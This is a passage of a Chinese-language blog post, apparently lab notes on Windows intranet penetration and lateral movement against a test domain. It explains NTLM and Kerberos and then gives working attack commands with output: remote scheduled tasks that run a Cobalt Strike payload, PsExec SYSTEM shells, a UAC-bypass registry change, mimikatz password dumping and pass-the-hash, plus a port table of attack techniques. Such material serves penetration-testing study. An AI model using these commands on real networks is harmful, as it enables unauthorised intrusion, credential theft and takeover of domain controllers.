+<h3 id="nltest查询信任域"><a href="#nltest查询信任域" class="headerlink" title="nltest查询信任域"></a>nltest查询信任域</h3><p>信任域：可以在工作组里查询，查询内网里是否有域环境</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\yutaowin10&gt;nltest /domain_trusts /all_trusts  /v /server:192.168.188.100</span><br><span class="line">域信任的列表:</span><br><span class="line">    0: GHOST ghost.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)</span><br><span class="line">       Dom Guid: 9212c4c0-c5ea-49ff-9d48-84fa55b8d0a8</span><br><span class="line">       Dom Sid: S-1-5-21-1238213221-2393825874-2881136966</span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure>
+
+<p>返回所有信任192.168.188.100的域</p>
+<p><code>nltest /dsgetdc:ghost /server:192.168.188.100</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\yutaowin10&gt;nltest /dsgetdc:ghost /server:192.168.188.100</span><br><span class="line">           DC: \\WIN-4JS3YOGGQ2T</span><br><span class="line">      地址: \\192.168.188.100</span><br><span class="line">     Dom Guid: 9212c4c0-c5ea-49ff-9d48-84fa55b8d0a8</span><br><span class="line">     Dom 名称: GHOST</span><br><span class="line">  林名称: ghost.com</span><br><span class="line"> DC 站点名称: Default-First-Site-Name</span><br><span class="line">我们的站点名称: Default-First-Site-Name</span><br><span class="line">        标志: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET</span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h2><table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>攻击技巧</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>21/22/69</td>
+<td>ftp/tftp：文件传输协议</td>
+<td>爆破\嗅探\溢出\后门</td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh：远程连接</td>
+<td>爆破OpenSSH；28个退格</td>
+</tr>
+<tr>
+<td>23</td>
+<td>telnet：远程连接</td>
+<td>爆破\嗅探</td>
+</tr>
+<tr>
+<td>25</td>
+<td>smtp：邮件服务</td>
+<td>邮件伪造</td>
+</tr>
+<tr>
+<td>53</td>
+<td>DNS：域名系统</td>
+<td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td>
+</tr>
+<tr>
+<td>67/68</td>
+<td>dhcp</td>
+<td>劫持\欺骗</td>
+</tr>
+<tr>
+<td>110</td>
+<td>pop3</td>
+<td>爆破</td>
+</tr>
+<tr>
+<td>139</td>
+<td>samba</td>
+<td>爆破\未授权访问\远程代码执行</td>
+</tr>
+<tr>
+<td>143</td>
+<td>imap</td>
+<td>爆破</td>
+</tr>
+<tr>
+<td>161</td>
+<td>snmp</td>
+<td>爆破</td>
+</tr>
+<tr>
+<td>389</td>
+<td>ldap</td>
+<td>注入攻击\未授权访问</td>
+</tr>
+<tr>
+<td>512/513/514</td>
+<td>linux r</td>
+<td>直接使用rlogin</td>
+</tr>
+<tr>
+<td>873</td>
+<td>rsync</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>1080</td>
+<td>socket</td>
+<td>爆破：进行内网渗透</td>
+</tr>
+<tr>
+<td>1352</td>
+<td>lotus</td>
+<td>爆破：弱口令\信息泄漏：源代码</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>mssql</td>
+<td>爆破：使用系统用户登录\注入攻击</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>oracle</td>
+<td>爆破：TNS\注入攻击</td>
+</tr>
+<tr>
+<td>2049</td>
+<td>nfs</td>
+<td>配置不当</td>
+</tr>
+<tr>
+<td>2181</td>
+<td>zookeeper</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>mysql</td>
+<td>爆破\拒绝服务\注入</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>rdp</td>
+<td>爆破\Shift后门</td>
+</tr>
+<tr>
+<td>4848</td>
+<td>glassfish</td>
+<td>爆破：控制台弱口令\认证绕过</td>
+</tr>
+<tr>
+<td>5000</td>
+<td>sybase/DB2</td>
+<td>爆破\注入</td>
+</tr>
+<tr>
+<td>5432</td>
+<td>postgresql</td>
+<td>缓冲区溢出\注入攻击\爆破：弱口令</td>
+</tr>
+<tr>
+<td>5632</td>
+<td>pcanywhere</td>
+<td>拒绝服务\代码执行</td>
+</tr>
+<tr>
+<td>5900</td>
+<td>vnc</td>
+<td>爆破：弱口令\认证绕过</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>redis</td>
+<td>未授权访问\爆破：弱口令</td>
+</tr>
+<tr>
+<td>7001</td>
+<td>weblogic</td>
+<td>Java反序列化\控制台弱口令\控制台部署webshell</td>
+</tr>
+<tr>
+<td>80/443/8080</td>
+<td>web</td>
+<td>常见web攻击\控制台爆破\对应服务器版本漏洞</td>
+</tr>
+<tr>
+<td>8069</td>
+<td>zabbix</td>
+<td>远程命令执行</td>
+</tr>
+<tr>
+<td>9090</td>
+<td>websphere控制台</td>
+<td>爆破：控制台弱口令\Java反序列</td>
+</tr>
+<tr>
+<td>9200/9300</td>
+<td>elasticsearch</td>
+<td>远程代码执行</td>
+</tr>
+<tr>
+<td>11211</td>
+<td>memcacache</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>27017</td>
+<td>mongodb</td>
+<td>爆破\未授权访问</td>
+</tr>
+</tbody></table>
+<h1 id="6-Windows认证协议"><a href="#6-Windows认证协议" class="headerlink" title="6.Windows认证协议"></a>6.Windows认证协议</h1><p>Windows主要使用NTLM和kerberos认证</p>
+<h2 id="1-NTLM认证"><a href="#1-NTLM认证" class="headerlink" title="1.NTLM认证"></a>1.NTLM认证</h2><blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/79196603">NTLM认证</a></p>
+</blockquote>
+<p>NTLM是NT LAN Manager的缩写，NTLM是基于挑战/应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议。</p>
+<p>Windows 中是不保存明文密码的，只会保存密码的哈希值。 其中本机用户的密码哈希是放在 本地的 SAM 文件 里面，域内用户的密码哈希是存在域控的 NTDS.dit 文件 里面.</p>
+<p>eg：<code>Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</code></p>
+<p>其中<code>AAD3B435B51404EEAAD3B435B51404EE</code>是LM Hash，<code>31D6CFE0D16AE931B73C59D7E0C089C0</code>是NTLM Hash。</p>
+<p>NTLM 协议的认证过程有三步：</p>
+<ul>
+<li>  <strong>协商</strong>：主要用于确认双方协议版本（NTLMv1、NTLMv2等）</li>
+<li>  <strong>质询</strong>：质询/应答 （<em>Challenge/Response</em>）模式，用于消息交换</li>
+<li>  <strong>验证</strong>：验证身份合法性，通常由 Server端或 DC完成这个过程</li>
+</ul>
+<h3 id="LM-hash"><a href="#LM-hash" class="headerlink" title="LM hash"></a>LM hash</h3><p>计算方法：</p>
+<p>1.密码转为大写，转换为16进制字符串，不足14字节将会用0来再后面补全。</p>
+<p>2.密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</p>
+<p>3.再分7bit为一组,每组末尾加0，再组成一组</p>
+<p>4.上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。</p>
+<p>5.将加密后的两组拼接在一起，得到最终LM HASH值。</p>
+<h3 id="NTLM-hash"><a href="#NTLM-hash" class="headerlink" title="NTLM hash"></a>NTLM hash</h3><p>从Windows Vista 和 Windows Server 2008开始，默认情况下只存储 NTLM Hash，LM Hash 将不再存在。。</p>
+<p>如果空密码或者不储蓄 LM Hash 的话，我们抓到的LM Hash是<code>AAD3B435B51404EEAAD3B435B51404EE</code>。所以在 Windows 7 中我们看到抓到 LM Hash 都是<code>AAD3B435B51404EEAAD3B435B51404EE</code>，这里的 LM Hash 已经没有任何价值了。</p>
+<p>NTLM hash计算方法：</p>
+<ul>
+<li>  1.先将用户密码转换为十六进制格式。</li>
+<li>  2.将十六进制格式的密码进行Unicode编码。</li>
+<li>  3.使用MD4摘要算法对Unicode编码数据进行Hash计算</li>
+</ul>
+<p>NTLM认证分为本地认证和网络认证。</p>
+<p>有三个版本， NTLMv1 、NTLMv2 、NTLMsession v2 三个版本，目前使用最多的是NTLMv2版本。</p>
+<h4 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h4><p>Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)中。</p>
+<blockquote>
+<p>  SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code></p>
+</blockquote>
+<p>当用户输入密码进行本地认证的过程中，用户输入的密码将为被转化为 NTLM Hash，然后与SAM中的NTLM Hash进行比较。当用户注销、重启、锁屏后，操作系统会让 <strong>winlogon.exe</strong> 显示登录界面（输入框）。当 winlogon.exe 接收输入后，会将密码交给lsass进程。<strong>lsass.exe</strong> 是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略，这个进程中会存一份明文密码，将明文密码加密成 NTLM Hash，对SAM数据库比较认证。</p>
+<blockquote>
+<p>  winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</p>
+</blockquote>
+<p>Net-NTLM Hash v1的格式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure>
+
+<p>Net-NTLM Hash v2的格式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure>
+
+<p>客户端发送用户名等身份信息，服务端生成随机16位challenge发给客户端，客户端使用NTLM hash加密challenge发给服务端。服务端通过用户名找到NTLM hash然后加密challenge跟客户端发送过来的比对，比对成功则认证成功。</p>
+<h4 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h4><p>这种情况适用于使用域账号登录的场景，这个时候服务端是没有用户的hash的。所以不一样的地方是服务端会将用户信息、challenge、客户端返回的信息都发给域控，由域控做认证再返回结果。流程图见下图</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1619093645_6081688d6fe4ca32a240d.png!small" alt="1619093645_6081688d6fe4ca32a240d.png!small?1619093647476"></p>
+<h2 id="2-kerberos认证"><a href="#2-kerberos认证" class="headerlink" title="2.kerberos认证"></a>2.kerberos认证</h2><p>Kerberos认证的是由三方来完成的，他们分别是client、server、KDC(Key Distribution Center密钥分发中心)</p>
+<p>KDC 服务默认会安装在一个域的域控中，而 Client 和 Server 为域内的用户或者是服务，如 HTTP 服务，SQL 服务。在 Kerberos 中 Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来决定。</p>
+<p>其中KDC是由两种服务所构成的：</p>
+<ul>
+<li><p>  AS(Authentication Service)：验证 Client 端的身份，验证通过就会给一张 TGT（Ticket Granting Ticket）票给 Client。</p>
+</li>
+<li><p>  TGS(Ticket Granting Service)：通过 AS 发送给 Client 的票（TGT）换取访问 Server 端的票ST（ServiceTicket）也有资料称为 TGS Ticket，为了和 TGS 区分，在这里就用 ST 来说明。</p>
+</li>
+</ul>
+<p>AS是用来为client生成TGT(Ticket Granting Ticket)的，TGS是用来为client生成某个服务的ST的，TGT是用来获取ST的临时凭证，ST是用来访问某种服务所必须使用的票据。</p>
+<p>KDC 服务框架中包含一个krbtgt账户，它是在创建域时系统自动创建的一个账号，你可以暂时理解为他就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</p>
+<h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1619093657_60816899201be08a4b1ab.png!small" alt="1619093657_60816899201be08a4b1ab.png!small?1619093659321"></p>
+<p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块：</p>
+<p><strong>The Authentication Service Exchange</strong>：Client 与 AS 的交互；</p>
+<p><strong>The Ticket-Granting Service (TGS) Exchange</strong>：Client 与 TGS 的交互；</p>
+<p><strong>The Client/Server Authentication Exchange</strong>：Client 与 Server 的交互。</p>
+<ol>
+<li><p>client与AS：</p>
+<p> client发送： 用户名 + 用户密码加密（用户信息，时间戳等）</p>
+<p> AS：根据用户名找到用户密码，解密出用户信息和事件戳，核实成功后认证成功，然后随机生成一个session key</p>
+<p> AS发送：用户密码加密（session key） + TGT(也就是krbtgt加密（用户信息，session key）)</p>
+<p> 注意：TGT中用户唯一不知道的是krbtgt的密码hash，所以有了这个hash，就可以自己伪造TGT，也就是所谓的<strong>金票据</strong>。</p>
+</li>
+<li><p>client与TGS交互</p>
+<p> client发送：session key加密（用户信息，时间戳等） + 需要访问的服务名 + TGT</p>
+<p> TGS：使用krbtgt密码解密TGT，获得session key 解密出用户信息，与TGS中的用户信息比对。认证成功后生成随机的 server session key</p>
+<p> TGS发送：session key加密（server session key） + ST(也就是对应服务端密码加密（用户信息，server session key）)</p>
+<p> 注意：ST中用户唯一不知道的是server的密码hash，所以有了这个hash，就可以自己伪造ST，也就是所谓的<strong>银票据</strong>。</p>
+</li>
+<li><p>client与server交互</p>
+<p> client发送：server session key加密（用户信息，时间戳等） + ST</p>
+<p> server：使用自己的密码解密ST，获得server session key，然后将server session key解密后获得的用户信息和ST中的用户信息比对，认证成功。</p>
+</li>
+</ol>
+<h2 id="3-PAC-特权属性证书"><a href="#3-PAC-特权属性证书" class="headerlink" title="3.PAC(特权属性证书)"></a>3.PAC(特权属性证书)</h2><p>在 Kerberos 最初设计的几个流程里说明了如何证明 Client 是 Client 而不是由其他人来冒充的，但并没有声明 Client 有没有访问 Server 服务的权限，因为在域中不同权限的用户能够访问的资源是有区别的。<br>所以微软为了解决这个问题在实现 Kerberos 时加入了 PAC 的概念，PAC 的全称是 Privilege Attribute Certificate(特权属性证书)。可以理解为火车有一等座，也有二等座，而 PAC 就是为了区别不同权限的一种方式。</p>
+<h1 id="7-横向移动总结"><a href="#7-横向移动总结" class="headerlink" title="7.横向移动总结"></a>7.横向移动总结</h1><h2 id="Windows远程连接命令"><a href="#Windows远程连接命令" class="headerlink" title="Windows远程连接命令"></a>Windows远程连接命令</h2><h3 id="IPC连接"><a href="#IPC连接" class="headerlink" title="IPC连接"></a>IPC连接</h3><p>条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.开放了139、445端口；</span><br><span class="line">2.目标开启ipc$文件共享；</span><br><span class="line">3.获取用户账号密码；</span><br></pre></td></tr></table></figure>
+
+<p>ipc+计划任务恒横向移动：</p>
+<p>（1）首先建立向目标主机的<code>IPC$</code>连接</p>
+<p>（2）命令执行的脚本传到目标主机</p>
+<p>（3）创建计划任务在目标机器上执行命令脚本</p>
+<p>（4）删除<code>IPC$</code>连接</p>
+<p><strong>连接</strong>：</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319141047308.png" alt="image-20220319141047308"></p>
+<p><strong>映射</strong>：</p>
+<p><code>net use z: \\192.168.188.100\c$ Admin123! /user:Administrator</code>（把目标C盘映射到本地z盘）</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319141844900.png" alt="image-20220319141844900"></p>
+<p><strong>访问/删除路径</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use z: \\192.168.188.100\c$   #直接访问</span><br><span class="line">net use c: /del                 删除映射的c盘，其他盘类推 </span><br><span class="line">net use * /del                 删除全部,会有提示要求按y确认</span><br></pre></td></tr></table></figure>
+
+<p><strong>删除IPC连接</strong>：</p>
+<p><code>net use \\192.168.188.100\ipc$ /del</code></p>
+<h3 id="at命令"><a href="#at命令" class="headerlink" title="at命令"></a>at命令</h3><blockquote>
+<p>  at 命令是Windows自带的用于创建计划任务的命令，但是at 命令只在2003及以下的版本使用。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。</p>
+</blockquote>
+<p>at计划命令在实战中主要有两个用处：一是在获取webshell后不能够执行系统命令的情况下可以用at命令将命令执行后写入txt再用type读取，二是利用at计划任务命令上线cs或者msf</p>
+<p>因为at只在2003以下，这里使用win2003（）的机子。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.188.100 14:27:00 cmd.exe /c &quot;ipconig &gt; c:\result.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>之后使用type读取</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319143430449.png" alt="image-20220319143430449"></p>
+<p>一定要注意主机的时间，使用<code>net time \\192.168.188.100</code>查看</p>
+<p><strong>删除计划任务</strong>：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> <span class="number">1</span> /<span class="keyword">delete</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="schtash命令"><a href="#schtash命令" class="headerlink" title="schtash命令"></a>schtash命令</h3><p>2008及以上都没at了，使用schtash代替。</p>
+<p>可以直接将cs的exe copy到目标机：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\xxxx\artifact.exe \\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span>\c$</span><br></pre></td></tr></table></figure>
+
+<p>之后使用schtash创建计划任务：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /TN cs /s <span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /u <span class="string">&quot;Administrator&quot;</span> /p <span class="string">&quot;Admin123!&quot;</span> /TR C:\artifact.exe /SC once /ST <span class="number">17</span>:<span class="number">32</span></span><br><span class="line"></span><br><span class="line">/TN 指定任务的名称</span><br><span class="line">/s 指定远程计算机的名称或 IP 地址</span><br><span class="line">/TR 指定任务运行的程序或命令</span><br><span class="line">/SC 指定计划类型。 </span><br><span class="line">/ST 使用<span class="number">24</span>小时时间格式 HH： mm 指定任务的开始时间。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看帮助</span><br><span class="line">schtasks /create /?</span><br><span class="line"></span><br><span class="line">执行计划任务</span><br><span class="line">schtasks /run /tn cs /s <span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /u <span class="string">&quot;Administrator&quot;</span> /p <span class="string">&quot;Admin123!&quot;</span></span><br><span class="line"></span><br><span class="line">查看运行状态</span><br><span class="line">schtasks /query /s <span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /u <span class="string">&quot;Administrator&quot;</span> /p <span class="string">&quot;Admin123!&quot;</span> | findstr <span class="string">&quot;cs&quot;</span></span><br><span class="line"></span><br><span class="line">删除</span><br><span class="line">schtasks /<span class="keyword">delete</span> /F /tn todayfive /s <span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /u <span class="string">&quot;Administrator&quot;</span> /p <span class="string">&quot;Admin123!&quot;</span></span><br><span class="line">/f 禁止显示确认消息。 删除任务但不发出警告</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用PsExec"><a href="#使用PsExec" class="headerlink" title="使用PsExec"></a>使用PsExec</h2><p>微软自家的，不会被杀</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">tool_download</a></p>
+<p>需要远程系统开启admin共享（默认是开启的），原理是基于IPC共享，目标需要开放445端口和admin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -accepteula \\192.168.188.100 -u WIN-4JS3YOGGQ2T\administrator -p Admin123! -s cmd.exe</span><br><span class="line"></span><br><span class="line">-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框</span><br><span class="line">-s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell</span><br></pre></td></tr></table></figure>
+
+<p>也可以net连上之后psexec：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.188.100\ipc$ Admin123! /user:administrator </span><br><span class="line"></span><br><span class="line">PsExec.exe -accepteula \\192.168.188.100 cmd.exe</span><br><span class="line">or</span><br><span class="line">PsExec.exe -accepteula \\192.168.188.100 ipconfig</span><br></pre></td></tr></table></figure>
+
+<p>注意要关UAC或者加注册表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem</span><br><span class="line">添加新DWORD值，键值：LocalAccountTokenFilterPolicy 为1。</span><br></pre></td></tr></table></figure>
+
+<p>但我一直是拒绝访问，，，，不知道为啥。。。。。</p>
+<h2 id="PTH-Hash传递攻击，pass-the-hash"><a href="#PTH-Hash传递攻击，pass-the-hash" class="headerlink" title="PTH(Hash传递攻击，pass the hash)"></a>PTH(Hash传递攻击，pass the hash)</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8690">Kerberos相关攻击技巧</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1829649">Hash传递攻击</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1752168">内网渗透之命令行渗透 - 渗透红队笔记</a></p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>PTH攻击是指攻击者可以通过捕获密码的hash值（无需解密），简单地将其传递来进行身份验证，以此来横向访问其他网络系统。</p>
+<p>攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。</p>
+<p>工具：</p>
+<blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">Github</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></p>
+</blockquote>
+<h3 id="使用mimikatz"><a href="#使用mimikatz" class="headerlink" title="使用mimikatz"></a>使用mimikatz</h3><p>使用mimikatz抓取密码或者hash，其实如果在域内主机可以获取到明文密码，我们可以使用明文密码进行登录，但是在很多情况下，由于域内密码复杂度要求，我们可能无法获取到域内主机明文密码，这就导致我们必须使用hash传递来获取域控权限。</p>
+<p>需要本地管理员权限</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug  <span class="comment"># 查看是否有debug权限</span></span><br><span class="line">token::elevate    <span class="comment"># 提升到最高权限</span></span><br><span class="line">sekurlsa::logonpasswords full  <span class="comment">#抓取所有的密码,如果密码复杂则只会抓到hash</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318183012610.png" alt="image-20220318183012610"></p>
+<p>查看域控文件目录：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># sekurlsa::pth /user:administrator /domain:ghost /ntlm:520126a03f5d5a8d836f1c4f34ede7ce</span></span><br><span class="line">user    : administrator</span><br><span class="line">domain  : ghost</span><br><span class="line">program : cmd.exe</span><br><span class="line">impers. : no</span><br><span class="line">NTLM    : 520126a03f5d5a8d836f1c4f34ede7ce</span><br><span class="line">  |  PID  6968</span><br><span class="line">  |  TID  4008</span><br><span class="line">  |  LSA Process is now R/W</span><br><span class="line">  |  LUID 0 ; 22668132 (00000000:0159e364)</span><br><span class="line">  \_ msv1_0   - data copy @ 000001F6C8FFE6F0 : OK !</span><br><span class="line">  \_ kerberos - data copy @ 000001F6C8E5ED28</span><br><span class="line">   \_ des_cbc_md4       -&gt; null</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ *Password replace @ 000001F6C8465DC8 (32) -&gt; null</span><br></pre></td></tr></table></figure>
+
+<p>会弹出来个cmd，这个cmd是域内主机的cmd，不是域控的cmd。</p>
+<p>可以直接连接该主机、查看目录文件等操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">连接域控：net use \\192.168.188.100</span><br><span class="line">查看文件目录：dir \\192.168.188.100\c$</span><br></pre></td></tr></table></figure>
+
+<p>查看目标开放的共享</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users&gt;net view \\192.168.188.100</span><br><span class="line">在 \\192.168.188.100 的共享资源</span><br><span class="line">共享名    类型  使用为  注释</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">NETLOGON  Disk          Logon server share</span><br><span class="line">SYSVOL    Disk          Logon server share</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+
+<p>只有域控才会有下面两个共享目录：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NETLOGON      Disk          Logon server share</span><br><span class="line">SYSVOL        Disk          Logon server share</span><br></pre></td></tr></table></figure>
+
+<p>删除链接</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /del /y</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\Users&gt;net use \\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /del /y</span><br><span class="line">\\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> 已经删除。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>copy 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#把当前机器C盘下的1.txt文件拷贝到目标桌面</span><br><span class="line">copy 1.txt \\192.168.188.100\c$\users\administrator\desktop\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318185354157.png" alt="image-20220318185354157"></p>
